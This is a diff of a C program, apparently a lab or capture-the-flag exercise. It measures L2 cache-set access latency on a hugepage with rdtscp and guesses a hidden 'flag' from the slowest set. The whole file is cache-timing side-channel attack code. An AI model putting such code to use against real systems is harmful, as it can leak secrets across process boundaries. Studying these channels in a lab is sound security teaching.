@@ -1,60 +1,58 @@
 #include "util.h"
-// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
 #include <sys/mman.h>
+#include <unistd.h>
 
-#define BUFF_SIZE (1<<21) // 2MB
-#define NUM_SETS 1024     // 2MB hugepage = 1024 cache sets
-#define STRIDE (1<<12)    // 4KB stride (different page offset)
-#define ADDRS_PER_SET 8   // Number of addresses per set
+#define BUFF_SIZE (2 * 1024 * 1024)  // 2MB Hugepage
+#define CACHE_LINE_SIZE 64
+#define NUM_L2_CACHE_SETS 2048
+#define PROBES 10
 
 int main(int argc, char const *argv[]) {
     int flag = -1;
 
-    // Allocate hugepage memory
+    // Step 1: Allocate hugepage memory
     uint8_t *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
-                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB,
-                        -1, 0);
+                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
     if (buf == MAP_FAILED) {
-        perror("mmap() failed");
+        perror("mmap failed");
         exit(1);
     }
+    memset(buf, 0, BUFF_SIZE);
 
-    uint64_t best_time = 0;
-    int best_set = -1;
+    // Step 2: Measure access times for each cache set
+    uint64_t times[NUM_L2_CACHE_SETS] = {0};
 
-    for (int set_index = 0; set_index < NUM_SETS; set_index++) {
+    for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
         uint64_t total_time = 0;
-
-        // Collect multiple addresses mapping to this set
-        for (int a = 0; a < ADDRS_PER_SET; a++) {
-            volatile uint8_t *addr = buf + (set_index * 64) + (a * STRIDE);
-
-            // Prime - access all addresses
-            *addr;
-        }
-
-        // Wait a little
-        for (volatile int i = 0; i < 10000; i++);
-
-        // Measure access times
-        for (int a = 0; a < ADDRS_PER_SET; a++) {
-            volatile uint8_t *addr = buf + (set_index * 64) + (a * STRIDE);
-
-            for (int repeat = 0; repeat < 5; repeat++) {
-                total_time += measure_one_block_access_time((uint64_t)addr);
+        for (int i = 0; i < PROBES; i++) {
+            uint64_t start = rdtscp64();
+            // Access 8 different cache lines for the set
+            for (int way = 0; way < 8; way++) {
+                volatile uint8_t *addr = buf + (set * CACHE_LINE_SIZE) + (way * 4096);
+                *addr;
             }
+            uint64_t end = rdtscp64();
+            total_time += (end - start);
         }
+        times[set] = total_time / PROBES;
+    }
 
-        // Compare total access time
-        if (total_time > best_time) {
-            best_time = total_time;
-            best_set = set_index;
+    // Step 3: Find the set with maximum latency
+    int guessed_flag = 0;
+    uint64_t max_time = 0;
+    for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+        if (times[set] > max_time) {
+            max_time = times[set];
+            guessed_flag = set;
         }
     }
 
-    flag = best_set;
+    flag = guessed_flag;
 
     printf("Flag: %d\n", flag);
-
     return 0;
 }
